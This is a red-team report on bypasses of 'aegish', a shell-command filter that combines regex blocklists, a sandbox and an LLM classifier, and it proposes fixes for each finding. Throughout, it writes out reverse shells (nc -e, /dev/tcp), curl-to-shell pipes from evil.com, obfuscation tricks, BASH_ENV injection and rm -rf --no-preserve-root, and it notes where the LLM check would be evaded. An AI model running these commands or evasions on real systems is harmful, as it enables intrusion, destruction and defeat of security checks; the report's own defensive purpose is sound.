# Trivial Bypass Vulnerability Report

## Red Team Analysis of the Trivial Bypass Mitigation Architecture

**Status:** RED — BLOCKING ISSUES FOUND
**Date:** 2026-02-22
**Scope:** Review of `docs/trivial-bypass-mitigation.md` (Changes 1–4 + Policy Engine)
**Standard:** "There must not be trivial ways to bypass aegish defense layers in production mode"
**Verdict:** Standard NOT met. 15 trivial bypasses survive all proposed defense layers.

---

## Table of Contents

1. [Executive Summary](#1-executive-summary)
2. [Methodology](#2-methodology)
3. [Trivial Bypass Definition](#3-trivial-bypass-definition)
4. [Tier 1: Showstopper Bypasses](#4-tier-1-showstopper-bypasses)
5. [Tier 2: High-Severity Bypasses](#5-tier-2-high-severity-bypasses)
6. [Tier 3: Architectural Concerns](#6-tier-3-architectural-concerns)
7. [Summary Scorecard](#7-summary-scorecard)
8. [Recommended Fixes](#8-recommended-fixes)

---

## 1. Executive Summary

Four independent red-team analyses were conducted against the proposed trivial bypass mitigation architecture (`docs/trivial-bypass-mitigation.md`). The document proposes four changes:

1. **Change 1:** Input normalization (ANSI-C, shlex, braceexpand, glob)
2. **Change 2:** Static blocklist expansion (11 new patterns)
3. **Change 3:** Parse failure hardening (WARN floor)
4. **Change 4:** Recursive command substitution resolution

Each change is individually sound but contains implementation gaps. The red team found **7 showstopper bypasses** (trivial rating 1/5, single command, deterministic) and **8 high-severity bypasses** (trivial rating 1–2/5) that survive all four proposed changes plus the policy engine.

The most impactful findings:

- **Backtick substitution** (`` `cmd` ``) completely evades the resolver's regex fallback — one character change from the canonical bypass
- **Absolute-path pipe-to-shell** (`| /bin/sh`) defeats the new static patterns
- **`${IFS}` variable expansion** defeats ALL whitespace-dependent and word-boundary patterns
- **Brace expansion >64 cap** has a fail-open fallback that hides dangerous patterns
- **Process substitution** (`bash <(cmd)`) is neither blocked nor resolved outside `source` context

---

## 2. Methodology

### Red Team Approach

Four parallel adversarial analyses, each focused on a different attack surface:

| Agent | Focus Area | Findings |
|-------|-----------|----------|
| RT-1 | Input normalization pipeline (Change 1) + static blocklist (Change 2) | 15 bypass vectors |
| RT-2 | Recursive resolution system (Change 4) + policy engine | 6 bypass vectors |
| RT-3 | Pipeline integration, policy engine decision paths, execution model | 12 bypass vectors |
| RT-4 | Bash/shell internals, Landlock sandbox, system-level vectors | 20 bypass vectors |

Findings were deduplicated and consolidated into 15 unique vulnerabilities across three severity tiers.

### Source Materials Reviewed

- `docs/trivial-bypass-mitigation.md` (proposed architecture, NOT IMPLEMENTED)
- `docs/transitive-validation-architecture.md` (full architecture, NOT IMPLEMENTED)
- `src/aegish/validator.py` (current validation pipeline)
- `src/aegish/constants.py` (static blocklist, META_EXEC_BUILTINS, DENIED_SHELLS)
- `src/aegish/executor.py` (command execution, sandbox, env allowlist)
- `src/aegish/llm_client.py` (LLM query, prompt construction)
- `src/aegish/shell.py` (shell loop, WARN confirmation flow)
- `src/aegish/config.py` (mode, role, fail_mode configuration)
- `src/aegish/sandbox.py` (Landlock, NO_NEW_PRIVS)

---

## 3. Trivial Bypass Definition

Per the mitigation document's own criteria (Section 1):

> A trivial bypass is defined as:
> - Requires no special tools or privileges
> - Discoverable in under 5 minutes by someone reading the source
> - Works reliably and deterministically (not probabilistic)
> - Directly bypasses a defense layer with a single command

All Tier 1 findings meet all four criteria. Tier 2 findings meet three or more criteria (some require two commands or knowledge of a specific bash feature).

---

## 4. Tier 1: Showstopper Bypasses

These are single-command, deterministic bypasses discoverable in under 60 seconds by reading the source. Each bypass is rated **1/5 trivial** (the easiest possible).

---

### S1. Backtick Substitution Completely Evades the Resolver

| Field | Value |
|-------|-------|
| **Bypass command** | `` time python3 -c `cat a.py` `` |
| **Precondition** | `a.py` contains `import os; os.system('bash')` |
| **Trivial rating** | 1/5 |
| **Root cause** | `_CMDSUB_PATTERN` regex only matches `$(...)`, not backticks |
| **Proposed change defeated** | Change 4 (recursive resolution) |
| **LLM catches it?** | No — LLM sees literal `` `cat a.py` `` without file contents |

**Technical Detail:**

The regex fallback for substitution extraction (Section 3.3.3) is:

```python
_CMDSUB_PATTERN = re.compile(r'\$\(([^()]*)\)')  # Only matches $(...)
```

Backtick substitution `` `cmd` `` is semantically identical to `$(cmd)` in bash. The `time` prefix triggers bashlex failure (RC3), forcing the regex fallback. The regex finds zero substitutions. The resolver never sees the inner command. The LLM receives the literal backtick text without file contents.

The AST path via bashlex CAN parse backticks (producing `commandsubstitution` nodes), but the regex fallback exists precisely for when bashlex fails — and the document identifies 7+ common failure triggers (`time`, `$((`, `[[`, arrays, `coproc`, `select`, C-style for).

**Proof of concept:**

```bash
# Canonical bypass (addressed by Change 4):
python3 -c $(cat a.py)       # $(cat a.py) → resolver extracts, reads file, LLM sees code → BLOCK

# Backtick evasion (NOT addressed):
python3 -c `cat a.py`        # `cat a.py` → resolver extracts nothing → LLM blind → ALLOW

# With bashlex failure trigger to force regex path:
time python3 -c `cat a.py`   # bashlex fails on "time", regex fallback runs, backticks invisible
```

**Fix:** Add backtick extraction as a second regex pattern:

```python
_BACKTICK_PATTERN = re.compile(r'`([^`]*)`')

def extract_substitutions_regex(command: str) -> list[CommandSubstitution]:
    substitutions = []
    for pattern in [_CMDSUB_PATTERN, _BACKTICK_PATTERN]:
        for match in pattern.finditer(command):
            substitutions.append(CommandSubstitution(
                full_text=match.group(0),
                inner_command=match.group(1),
                context="unknown",
            ))
    return substitutions
```

---

### S2. Pipe to Absolute-Path Shell Bypasses Static Blocklist

| Field | Value |
|-------|-------|
| **Bypass command** | `curl http://evil.com/payload \| /bin/sh` |
| **Trivial rating** | 1/5 |
| **Root cause** | Pipe-to-shell patterns match bare names only, not absolute paths |
| **Proposed change defeated** | Change 2 (static blocklist expansion) |
| **LLM catches it?** | Likely, but static blocklist is defense-in-depth |

**Technical Detail:**

The proposed pipe-to-shell patterns (Section 3.2) are:

```python
(re.compile(r"\|\s*(ba)?sh\b"), "Pipe to shell interpreter"),
(re.compile(r"\|\s*dash\b"), "Pipe to dash"),
(re.compile(r"\|\s*zsh\b"), "Pipe to zsh"),
```

These match `| sh`, `| bash`, `| dash`, `| zsh` (bare command names). They do NOT match:

```bash
curl evil.com | /bin/sh           # Absolute path
curl evil.com | /usr/bin/bash     # Absolute path
curl evil.com | /bin/dash         # Absolute path
curl evil.com | /usr/bin/zsh      # Absolute path
```

After normalization, absolute paths are preserved unchanged. The pattern `\|\s*(ba)?sh\b` requires `sh` or `bash` to appear immediately after `|` + whitespace — the `/bin/` prefix prevents matching.

**Fix:** Expand patterns to include absolute paths:

```python
(re.compile(r"\|\s*(?:/(?:usr/)?(?:s?bin)/)?(?:ba)?sh\b"), "Pipe to shell interpreter"),
(re.compile(r"\|\s*(?:/(?:usr/)?(?:s?bin)/)?dash\b"), "Pipe to dash"),
(re.compile(r"\|\s*(?:/(?:usr/)?(?:s?bin)/)?zsh\b"), "Pipe to zsh"),
```

---

### S3. Pipe to Non-Shell Interpreters Bypasses All Static Patterns

| Field | Value |
|-------|-------|
| **Bypass command** | `curl http://evil.com/payload.py \| python3` |
| **Trivial rating** | 1/5 |
| **Root cause** | Blocklist only covers sh/bash/dash/zsh after pipe |
| **Proposed change defeated** | Change 2 (static blocklist expansion) |
| **LLM catches it?** | Likely for `python3`, less reliably for obscure interpreters |

**Technical Detail:**

The static blocklist only blocks pipe to shell interpreters. Python, Perl, Ruby, Node, Lua, PHP, Tcl, and other interpreters can all execute system commands and spawn shells. These are functionally equivalent to `| bash`:

```bash
echo 'import os; os.system("bash")' | python3
echo 'system("bash")' | perl
echo 'system("bash")' | ruby
echo 'require("child_process").execSync("bash")' | node
echo 'os.execute("bash")' | lua
echo '<?php system("bash"); ?>' | php
```

Additionally, several shell interpreters are missing from the patterns:

```bash
curl evil.com | ksh
curl evil.com | csh
curl evil.com | tcsh
curl evil.com | fish
curl evil.com | ash
```

**Fix:** Add pipe-to-interpreter patterns using the existing `SCRIPT_INTERPRETERS` set from `constants.py:207-211`, or add a generalized pattern:

```python
# Use SCRIPT_INTERPRETERS set for comprehensive coverage
_PIPE_TO_INTERP = re.compile(
    r"\|\s*(?:/\S*/)?(?:" + "|".join(SCRIPT_INTERPRETERS) + r")\b"
)
```

---

### S4. `${IFS}` Variable Expansion Defeats All Word-Boundary Patterns

| Field | Value |
|-------|-------|
| **Bypass command** | `nc${IFS}-e${IFS}/bin/sh${IFS}10.0.0.1${IFS}4444` |
| **Trivial rating** | 1/5 |
| **Root cause** | Normalizer does not expand variables; `${IFS}` is not whitespace to regex |
| **Proposed change defeated** | Change 1 (normalization) and Change 2 (all static patterns) |
| **LLM catches it?** | Model-dependent; `${IFS}` is a well-known technique |

**Technical Detail:**

The normalizer (Change 1) uses `shlex.split` for quote normalization. `shlex` does NOT expand variables — `${IFS}`, `$IFS`, `$VAR` are preserved as literal text. Bash, however, expands `${IFS}` to the Internal Field Separator (space/tab/newline by default) at runtime.

The blocklist pattern `\bnc\b.*\s-e\s` requires literal whitespace (`\s`) around `-e`. The text `${IFS}` is not whitespace — it's 6 literal characters. The pattern does not match. But bash executes `nc -e /bin/sh 10.0.0.1 4444`.

This is a **universal bypass** for every pattern that depends on `\s` (whitespace) or `\b` (word boundary):

```bash
# All of these bypass their respective blocklist patterns:
nc${IFS}-e${IFS}/bin/sh${IFS}10.0.0.1${IFS}4444     # nc -e reverse shell
/dev/tcp${IFS}                                         # N/A (path-based, no \s)
mk${IFS}fs${IFS}/dev/sda                              # mkfs (but word boundary issue)
```

More generally, variable-based command construction:

```bash
n=nc; $n -e /bin/sh 10.0.0.1 4444           # $n is not \bnc\b
B=BASH; eval "${B}_ENV=/tmp/evil sh"         # ${B}_ENV is not \bBASH_ENV
```

**Fix:** Either:
1. Expand known dangerous variables during normalization (partial, arms-race)
2. Add regex patterns that account for `${IFS}` and `$IFS` between tokens
3. Accept that variable expansion is LLM-dependent and document it as a residual risk

---

### S5. Brace Expansion >64 Cap Has Fail-Open Fallback

| Field | Value |
|-------|-------|
| **Bypass command** | `bash -i >& /dev/tc{p/evil/443,a,b,c,...65 alternatives} 0>&1` |
| **Trivial rating** | 1/5 |
| **Root cause** | When expansion exceeds 64 variants, the unexpanded text is used (fail-open) |
| **Proposed change defeated** | Change 1 (normalization) + Change 2 (static blocklist) |
| **LLM catches it?** | Model-dependent; brace expansion is non-trivial to parse |

**Technical Detail:**

The normalization pipeline (Section 3.1) caps brace expansion at 64 variants:

```python
if len(brace_variants) > MAX_BRACE_VARIANTS:
    brace_variants = [result]  # Safety limit exceeded — use unexpanded text
```

When the limit is exceeded, the fallback preserves the **unexpanded** original. The text `/dev/tc{p/evil/443,...}` does NOT contain the literal substring `/dev/tcp/` (the `{` interrupts it). The blocklist pattern `r"/dev/tcp/"` does not match.

An attacker simply pads the brace expansion with dummy alternatives to exceed the 64-variant limit:

```bash
# 65 alternatives — exceeds cap:
bash -i >& /dev/tc{p/evil.com/443,aa,bb,cc,dd,ee,ff,gg,hh,ii,jj,kk,ll,mm,nn,oo,pp,qq,rr,ss,tt,uu,vv,ww,xx,yy,zz,a1,b1,c1,d1,e1,f1,g1,h1,i1,j1,k1,l1,m1,n1,o1,p1,q1,r1,s1,t1,u1,v1,w1,x1,y1,z1,a2,b2,c2,d2,e2,f2,g2,h2,i2,j2,k2,l2,m2} 0>&1
```

At runtime, bash expands the braces. One variant is `/dev/tcp/evil.com/443`, which opens the reverse shell.

**Fix:** When brace expansion exceeds the limit, BLOCK the command (fail-closed):

```python
if len(brace_variants) > MAX_BRACE_VARIANTS:
    return None, None  # Signal to caller: unresolvable, apply BLOCK
```

Or at minimum, preserve BOTH the unexpanded text AND cap at the first 64 variants for blocklist checking.

---

### S6. `exec` Builtin Not Blocked or Detected

| Field | Value |
|-------|-------|
| **Bypass command** | `exec python3 -c 'import pty; pty.spawn("/bin/bash")'` |
| **Trivial rating** | 1/5 |
| **Root cause** | `exec` is not in META_EXEC_BUILTINS or the static blocklist |
| **Proposed change defeated** | None of the four changes address `exec` |
| **LLM catches it?** | Likely for this specific example; less reliably for subtle uses |

**Technical Detail:**

`exec` is a bash builtin that replaces the current shell process with the specified command. It is one of the most direct execution primitives in bash. The current `META_EXEC_BUILTINS` set is `{"eval", "source", "."}` — `exec` is absent. No static blocklist pattern detects `exec`.

```bash
exec /bin/sh                    # Direct shell replacement
exec python3                    # Interpreter replacement
exec 3<>/dev/tcp/evil/443       # FD-based network connection without spawning a process
```

The third example (`exec` for file descriptor manipulation) is especially dangerous because it establishes network connections without any command name that the LLM would flag — the `exec` builtin with FD redirection does not execute a command; it opens a file descriptor.

**Fix:** Add `exec` to detection. For FD-based exec, add a blocklist pattern:

```python
(re.compile(r"\bexec\s+\d+[<>]"), "exec with file descriptor manipulation"),
```

For command-replacing exec, add to `META_EXEC_BUILTINS` or add specific patterns.

---

### S7. Process Substitution `<(cmd)` Not Resolved Outside `source` Context

| Field | Value |
|-------|-------|
| **Bypass command** | `bash <(curl http://evil.com/payload.sh)` |
| **Trivial rating** | 1/5 |
| **Root cause** | Change 2 only blocks `source <(` / `. <(`; Change 4 only resolves `$(...)` |
| **Proposed change defeated** | Change 2 (partial), Change 4 (not applicable) |
| **LLM catches it?** | Likely for `bash <(curl ...)`, less reliably for indirect uses |

**Technical Detail:**

Change 2 adds the pattern:

```python
(re.compile(r"(?:source|\.\s)\s*<\("), "Process substitution in source/dot"),
```

This ONLY detects `source <(cmd)` and `. <(cmd)`. It does NOT detect:

```bash
bash <(curl evil.com/payload.sh)         # Shell via process substitution
python3 <(cat a.py)                      # Interpreter via process substitution
perl <(cat payload.pl)                   # Interpreter via process substitution
/bin/sh <(echo 'nc -e /bin/sh evil 443') # Shell via absolute path + process sub
```

Change 4 (recursive resolution) only handles `$(...)` command substitutions. Process substitution `<(cmd)` creates a `/dev/fd/N` path — it is fundamentally different and is not detected or resolved by the resolver.

**Fix:** Either block ALL process substitution:

```python
(re.compile(r"<\("), "Process substitution"),
```

Or detect it specifically with interpreter/shell contexts:

```python
_PROC_SUB_INTERPRETERS = re.compile(
    r"(?:" + "|".join(SCRIPT_INTERPRETERS) + r")\s+.*<\("
)
```

Note: Blocking all `<(` would cause false positives for benign uses like `diff <(sort file1) <(sort file2)`. A context-aware approach is preferable.

---

## 5. Tier 2: High-Severity Bypasses

These bypasses are rated 1–2/5 trivial. Some require two commands or knowledge of a specific bash feature, but all are discoverable by reading the source.

---

### H1. Nested Parentheses Defeat Regex Fallback

| Field | Value |
|-------|-------|
| **Bypass command** | `python3 -c "$(awk 'BEGIN{print "hello"}')"` (with bashlex failure trigger) |
| **Trivial rating** | 2/5 |
| **Root cause** | `[^()]*` in `_CMDSUB_PATTERN` rejects `$(...)` containing any `()` characters |
| **Proposed change defeated** | Change 4 (regex fallback path) |

**Technical Detail:**

The regex `_CMDSUB_PATTERN = re.compile(r'\$\(([^()]*)\)')` uses `[^()]*` to match the inner command. This character class explicitly excludes `(` and `)`. Any inner command containing parentheses — which includes virtually all Python, Perl, awk, and Ruby code — cannot be matched.

When bashlex fails (forcing the regex fallback), commands like these have their substitutions invisible to the resolver:

```bash
python3 -c "$(python3 -c "print('bash')")"    # print() has parens
bash -c "$(awk 'BEGIN{system("sh")}')"          # system() has parens
perl -e "$(echo 'system("bash")')"             # system() has parens
```

**Fix:** Replace the non-nesting regex with iterative innermost-first matching or a balanced-parentheses scanner:

```python
def extract_substitutions_regex(command: str) -> list[CommandSubstitution]:
    """Iteratively extract $(…) by finding balanced parentheses."""
    substitutions = []
    i = 0
    while i < len(command) - 1:
        if command[i] == '$' and command[i + 1] == '(':
            depth = 1
            start = i
            j = i + 2
            while j < len(command) and depth > 0:
                if command[j] == '(':
                    depth += 1
                elif command[j] == ')':
                    depth -= 1
                j += 1
            if depth == 0:
                full = command[start:j]
                inner = command[start + 2:j - 1]
                substitutions.append(CommandSubstitution(
                    full_text=full, inner_command=inner, context="unknown",
                ))
            i = j
        else:
            i += 1
    return substitutions
```

---

### H2. `rm -rf / --no-preserve-root` Bypasses Static Pattern

| Field | Value |
|-------|-------|
| **Bypass command** | `rm -rf / --no-preserve-root` |
| **Trivial rating** | 1/5 |
| **Root cause** | `$` end-of-string anchor in rm pattern |
| **Proposed change defeated** | Existing blocklist (unchanged by proposal) |

**Technical Detail:**

The destructive rm patterns use `$` (end-of-string anchor):

```python
(re.compile(r"\brm\s+-[^\s]*r[^\s]*f[^\s]*\s+/\*?\s*$"), "Destructive rm -rf /"),
```

This matches `rm -rf /` or `rm -rf /*` at the END of the string only. The actually-dangerous form on modern Linux requires `--no-preserve-root`:

```bash
rm -rf / --no-preserve-root   # Dangerous — not caught (suffix after /)
rm -rf / ; echo done           # Dangerous — not caught (suffix after /)
rm -rf /home /var /etc          # Dangerous — not caught (not just /)
```

On modern Linux, bare `rm -rf /` is a no-op (the `--preserve-root` default prevents it). The blocklist specifically blocks the harmless form while allowing the dangerous form.

**Fix:** Remove the `$` anchor and broaden the pattern:

```python
(re.compile(r"\brm\s+-[^\s]*r[^\s]*f[^\s]*\s+/(?:\s|$|\*)"), "Destructive rm -rf /"),
```

---

### H3. `shlex.split` Failure Bypasses Glob Resolution

| Field | Value |
|-------|-------|
| **Bypass command** | `bash -i >& /dev/tc[p]/evil.com/443 0>&1 "` |
| **Trivial rating** | 2/5 |
| **Root cause** | Both Step 2 and `_resolve_globs_in_command` depend on `shlex.split` |
| **Proposed change defeated** | Change 1 (normalization, glob resolution step) |

**Technical Detail:**

Adding a trailing malformed quote (`"` without a closing `"`) causes `shlex.split` to raise `ValueError`. Both Step 2 (quote normalization) and `_resolve_globs_in_command` call `shlex.split` — both fail. The glob pattern `tc[p]` is never resolved to `tcp`. The blocklist sees `/dev/tc[p]/` which does not match `/dev/tcp/`.

```python
# _resolve_globs_in_command:
try:
    tokens = shlex.split(command)
except ValueError:
    return command  # Glob resolution SKIPPED entirely
```

Bash ignores the trailing unmatched quote in certain contexts or the attacker can craft a valid-to-bash but invalid-to-shlex input.

**Fix:** Implement glob resolution independently of `shlex.split`. Use a simple whitespace tokenizer that is tolerant of malformed quoting for the purpose of glob matching:

```python
def _resolve_globs_simple(command: str) -> str:
    """Resolve globs without shlex dependency."""
    import re
    tokens = re.split(r'(\s+)', command)  # Split on whitespace, preserving it
    result = []
    for token in tokens:
        if any(c in token for c in ('*', '?', '[', ']')):
            matches = glob.glob(token)
            if matches:
                result.append(' '.join(matches))
                continue
        result.append(token)
    return ''.join(result)
```

---

### H4. `ENV=` Missing from Blocklist

| Field | Value |
|-------|-------|
| **Bypass command** | `ENV=/tmp/evil.sh sh` |
| **Trivial rating** | 1/5 |
| **Root cause** | Pattern not added despite being documented as needed |
| **Proposed change defeated** | Change 2 (static blocklist expansion) |

**Technical Detail:**

The transitive architecture document (Section 4.2.1) explicitly lists `ENV=` as a pattern to block. The trivial bypass mitigation document discusses `BASH_ENV`, `LD_PRELOAD`, and `LD_LIBRARY_PATH` but does NOT include `ENV` in the actual pattern list (Section 3.2).

The `ENV` variable is used by POSIX `sh` — when `sh` starts, it sources the file specified by `$ENV`. This is the POSIX equivalent of `BASH_ENV`.

**Fix:** Add the pattern:

```python
(re.compile(r"\bENV\s*="), "ENV variable injection (POSIX sh)"),
```

Note: This may produce false positives for variables ending in `ENV` (e.g., `NODE_ENV=`). The `\b` word boundary between `_` and `E` in `NODE_ENV` does NOT trigger because `_` is a word character. So `NODE_ENV=` would NOT match. The pattern is safe.

---

### H5. `_bashlex_would_fail` Referenced But Undefined

| Field | Value |
|-------|-------|
| **Affected code** | Section 3.3.2, proposed `validate_command()` |
| **Trivial rating** | N/A (implementation gap, not a user-facing bypass) |
| **Root cause** | Function referenced in proposed pipeline but never defined |
| **Impact** | Parse failures in decomposition and cmdsub-in-exec-pos go undetected |

**Technical Detail:**

The proposed pipeline (Section 3.3.2) includes:

```python
if not parse_failed:
    parse_failed = _bashlex_would_fail(normalized)
```

This function does not exist. Without it, parse failures in the two bashlex call sites that still silently return `None` are not detected:

1. `_extract_subcommand_strings` (`validator.py:345`): `except Exception: return None`
2. `_has_command_substitution_in_exec_pos` (`validator.py:396`): `except Exception: return None`

If bashlex fails in either of these and the first check (`_check_variable_in_command_position`) did not set `parse_failed`, the WARN floor is never applied.

**Fix:** Either define the function:

```python
def _bashlex_would_fail(command: str) -> bool:
    try:
        bashlex.parse(command)
        return False
    except Exception:
        return True
```

Or modify all three bashlex exception handlers to set `parse_failed` (preferred — avoids redundant parsing).

---

### H6. Inner Command Side Effects Persist When Outer Is Blocked

| Field | Value |
|-------|-------|
| **Bypass commands** | `echo $(cp /bin/bash /tmp/mysh)` then `/tmp/mysh` |
| **Trivial rating** | 2/5 (two commands) |
| **Root cause** | Resolver executes ALLOWed inner commands before outer command policy decision |
| **Proposed change defeated** | Change 4 (recursive resolution execution model) |

**Technical Detail:**

The resolution algorithm (Section 3.4.4, step 4) executes inner commands that validate as ALLOW:

```python
# 4. ALLOW: execute in sandbox, capture stdout
result = execute_sandboxed_capture(inner_resolved, timeout=MAX_SUBSTITUTION_TIMEOUT_S)
```

`cp /bin/bash /tmp/mysh` is a simple file copy — likely ALLOW. Landlock restricts **execute** on shell binaries but not **copy**. The copy succeeds. `/tmp/mysh` is not in `DENIED_SHELLS` (which is a fixed path list per `constants.py:289-306`). In a subsequent command, `/tmp/mysh` executes as an unrestricted shell.

The `DENIED_SHELLS` list's own comments acknowledge this limitation:

```python
# Known limitation: This is a path-based denylist. A user who copies or
# renames a shell binary to a non-listed path (e.g. cp /bin/bash /tmp/mysh)
# can bypass this list.
```

**Fix:** Options:
1. Execute inner commands in a read-only sandbox (Landlock write restriction for resolver subprocesses)
2. Add static detection for `cp` of shell binaries: `re.compile(r"\bcp\b.*(?:/bin/(?:ba)?sh|/usr/bin/(?:ba)?sh)")`
3. Add the shell-binary-copy pattern to the LLM system prompt for heightened scrutiny

---

### H7. `\U` (8-Digit Unicode Escape) Not Handled by ANSI-C Resolver

| Field | Value |
|-------|-------|
| **Bypass command** | `$'\U0000006e\U00000063' -e /bin/sh 10.0.0.1 4444` |
| **Trivial rating** | 2/5 |
| **Root cause** | ANSI-C resolver handles `\xHH`, `\NNN`, `\uHHHH` but not `\UHHHHHHHH` |
| **Proposed change defeated** | Change 1 (ANSI-C quote resolution) |

**Technical Detail:**

The proposed `_resolve_ansi_c_quotes` function (Section 3.1) handles:
- `\xHH` (hex, 2 digits)
- `\NNN` (octal, 1-3 digits)
- `\uHHHH` (Unicode, 4 digits)
- Named escapes (`\n`, `\t`, etc.)

Bash also supports `\UHHHHHHHH` (Unicode, 8 digits). The resolver does not handle this. `$'\U0000006e\U00000063'` evaluates to `nc` in bash but is not decoded by the normalizer.

**Fix:** Add `\U` handling:

```python
# 8-digit Unicode escapes: \UHHHHHHHH
inner = re.sub(
    r'\\U([0-9a-fA-F]{8})',
    lambda m: chr(int(m.group(1), 16)),
    inner,
)
```

---

### H8. `read BASH_ENV` / `printf -v BASH_ENV` Set Variables Without `=`

| Field | Value |
|-------|-------|
| **Bypass command** | `read BASH_ENV <<< '/tmp/evil.sh'; bash` |
| **Trivial rating** | 2/5 |
| **Root cause** | `BASH_ENV\s*=` pattern requires `=` sign; `read` and `printf -v` don't use `=` |
| **Proposed change defeated** | Change 2 (static blocklist, `BASH_ENV=` pattern) |

**Technical Detail:**

The pattern `\bBASH_ENV\s*=` matches direct assignment syntax. But bash can set variables without `=`:

```bash
read BASH_ENV <<< '/tmp/evil.sh'; bash     # read sets variable
printf -v BASH_ENV '%s' '/tmp/evil.sh'; bash # printf -v sets variable
IFS= read -r BASH_ENV < /tmp/path; bash    # read from file
```

The environment allowlist (`_build_safe_env`) strips `BASH_ENV` from the inherited environment. But `read` and `printf -v` set variables WITHIN the current bash session. If the command is a compound command (e.g., `read BASH_ENV <<< '/tmp/evil.sh'; bash`), the second subcommand `bash` inherits the variable from the same session.

However, note that `_build_safe_env` strips `BASH_ENV` from the subprocess environment. The real question is whether the compound command runs in a single subprocess call (it does — `subprocess.run` executes the entire compound command as one `bash -c` invocation). Within that single bash session, `read BASH_ENV` sets the variable and `bash` inherits it.

**Fix:** Add patterns for variable-setting commands targeting dangerous variables:

```python
(re.compile(r"\bread\b.*\bBASH_ENV\b"), "BASH_ENV set via read"),
(re.compile(r"\bprintf\s+-v\s+BASH_ENV\b"), "BASH_ENV set via printf -v"),
```

Or more generally, detect any mechanism that sets `BASH_ENV`, `LD_PRELOAD`, or `LD_LIBRARY_PATH`:

```python
_DANGEROUS_VAR_NAMES = r"(?:BASH_ENV|LD_PRELOAD|LD_LIBRARY_PATH|ENV)"
(re.compile(r"\bread\b[^;|&]*\b" + _DANGEROUS_VAR_NAMES + r"\b"), "Dangerous variable set via read"),
(re.compile(r"\bprintf\s+-v\s+" + _DANGEROUS_VAR_NAMES + r"\b"), "Dangerous variable set via printf -v"),
```

---

## 6. Tier 3: Architectural Concerns

These are design-level issues that are not single-command bypasses but weaken the overall security posture.

---

### A1. Validated vs. Executed Command Divergence

The shell loop (`shell.py:141-151`) validates the **normalized** command but executes the **original** command. While no concrete exploit was found through `shlex.split/join` roundtrip differences, this semantic gap is a permanent source of potential future bugs. The normalized command (or at minimum, the command that the LLM actually analyzed) should be the one passed to `execute_command()`.

---

### A2. WARN Floor Is Insufficient as a Sole Defense

Parse failure (Change 3) and warned inner substitutions (Policy Engine Rule 4) produce WARN. The user types "y" and the command executes. For power users and in automated contexts, WARN becomes rubber-stamped. The WARN floor is appropriate for genuinely ambiguous cases but should not be the sole defense for commands that contain known-dangerous patterns that failed to match due to obfuscation.

**Recommendation:** If a command contains BOTH a parse failure AND any token that partially matches a blocklist pattern (e.g., `/dev/tc` without the final `p/`), escalate to BLOCK rather than WARN.

---

### A3. Recursive Resolution Budget Resets on Re-Entry

`resolve_substitutions` calls `validate_command()` for inner commands. `validate_command()` calls `resolve_substitutions()` with `budget=None`, creating a new budget. The depth counter and substitution count limits are not shared across the full call tree. This enables denial-of-service via deep nesting (10 levels = 10 LLM API calls, ~300 seconds total).

**Fix:** Pass the budget through `validate_command` to `resolve_substitutions` via a context parameter or thread-local variable.

---

### A4. Heredocs and Here-Strings Not Addressed

```bash
python3 <<'EOF'
import os; os.system('bash')
EOF
```

```bash
bash <<<'nc -e /bin/sh evil.com 4444'
```

Heredocs and here-strings are not command substitutions. Change 4 does not handle them. Heredocs may or may not trigger bashlex failure (simple heredocs may parse successfully). When they parse successfully, no WARN floor applies and the LLM sees only the structural `<<EOF` without the body content.

**Recommendation:** Extract heredoc bodies and here-string content, send to LLM as resolved content. This is documented in the transitive architecture document (Section 4.4.2) but absent from the trivial bypass mitigation.

---

### A5. `trap` Handlers Enable Deferred Execution

```bash
trap '/bin/sh' EXIT    # Shell on exit
trap '/bin/sh' DEBUG   # Shell before EVERY subsequent command
```

`trap` is not in the static blocklist. The `DEBUG` trap is especially dangerous — it executes before every subsequent command in the session. Neither `trap` with code arguments nor specific signal-based traps are detected by any proposed change.

---

### A6. `bash <<<'code'` Here-String Bypasses Pipe Detection

```bash
bash <<<'nc -e /bin/sh evil 4444'
```

This is not a pipe (`|`), not a command substitution (`$()`), and not process substitution (`<()`). The here-string `<<<` feeds input directly to bash's stdin. No static pattern detects this.

---

### A7. Environment Variable Expansion Not Checked by Static Blocklist

The existing LLM prompt construction (`llm_client.py:382-385`) expands environment variables via `envsubst` and sends the expanded version to the LLM. But the static blocklist and normalization pipeline do NOT check the env-expanded version. A command like:

```bash
X=/dev/tcp/evil/443; bash -i >& $X 0>&1
```

The blocklist sees `$X` (no match for `/dev/tcp/`). The LLM receives the expanded version and should catch it, but the static blocklist defense layer is completely bypassed.

---

## 7. Summary Scorecard

| ID | Bypass | Trivial | Single Cmd | Deterministic | Proposed Fix Handles It |
|----|--------|:-------:|:----------:|:-------------:|:-----------------------:|
| **S1** | Backtick substitution evasion | 1/5 | Yes | Yes | **NO** |
| **S2** | `\| /bin/sh` absolute path | 1/5 | Yes | Yes | **NO** |
| **S3** | `\| python3` non-shell interpreter | 1/5 | Yes | Yes | **NO** |
| **S4** | `${IFS}` variable expansion | 1/5 | Yes | Yes | **NO** |
| **S5** | Brace expansion >64 cap (fail-open) | 1/5 | Yes | Yes | **NO** (made worse) |
| **S6** | `exec` builtin undetected | 1/5 | Yes | Yes | **NO** |
| **S7** | `bash <(cmd)` process substitution | 1/5 | Yes | Yes | **Partial** |
| **H1** | Nested `()` defeat regex fallback | 2/5 | Yes | Yes | **NO** |
| **H2** | `rm -rf / --no-preserve-root` | 1/5 | Yes | Yes | **NO** |
| **H3** | shlex failure + glob evasion | 2/5 | Yes | Yes | **NO** |
| **H4** | `ENV=` not in blocklist | 1/5 | Yes | Yes | **NO** |
| **H5** | `_bashlex_would_fail` undefined | N/A | N/A | N/A | **NO** |
| **H6** | Inner command side effects | 2/5 | 2 cmds | Yes | **NO** |
| **H7** | `\U` escape not handled | 2/5 | Yes | Yes | **NO** |
| **H8** | `read BASH_ENV` (no `=`) | 2/5 | Yes | Yes | **NO** |
| **A1** | Validated != executed command | — | — | — | **NO** |
| **A2** | WARN floor insufficient | — | — | — | Design trade-off |
| **A3** | Budget resets on recursion | — | — | — | **NO** |
| **A4** | Heredocs/here-strings unresolved | 1/5 | Yes | Yes | **NO** |
| **A5** | `trap` deferred execution | 1/5 | Yes | Yes | **NO** |
| **A6** | `bash <<<'code'` here-string | 1/5 | Yes | Yes | **NO** |
| **A7** | Env vars not blocklist-checked | 2/5 | 2 cmds | Yes | **NO** |

---

## 8. Recommended Fixes

### Priority 1 — Must fix before implementation (blocks the security standard)

| Fix | Addresses | Effort |
|-----|-----------|--------|
| Add backtick regex extraction (`_BACKTICK_PATTERN`) | S1 | Small |
| Expand pipe-to-shell patterns to include absolute paths | S2 | Small |
